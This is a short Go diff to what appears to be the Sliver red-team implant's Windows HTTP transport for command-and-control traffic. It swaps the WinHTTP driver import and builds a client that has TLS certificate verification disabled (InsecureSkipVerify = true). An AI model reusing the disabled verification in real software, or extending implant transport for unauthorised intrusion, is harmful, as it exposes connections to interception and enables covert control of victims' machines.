@@ -25,7 +25,7 @@ import (
 	"log"
 	// {{end}}
 
-	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient/winhttp"
+	winhttp "github.com/bishopfox/sliver/implant/sliver/transports/httpclient/drivers/win/winhttp/http"
 )
 
 // GetHTTPDriver - Get an instance of the specified HTTP driver
@@ -62,6 +62,11 @@ func WinHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, e
 	if err != nil {
 		return nil, err
 	}
-	driver := winhttp.NewWinHTTPClient(c2URL.Host, port)
-	return driver, nil
+	winhttpClient, err := winhttp.NewClient()
+	if err != nil {
+		return nil, err
+	}
+	winhttpClient.TLSClientConfig.InsecureSkipVerify = true
+
+	return winhttpClient, nil
 }
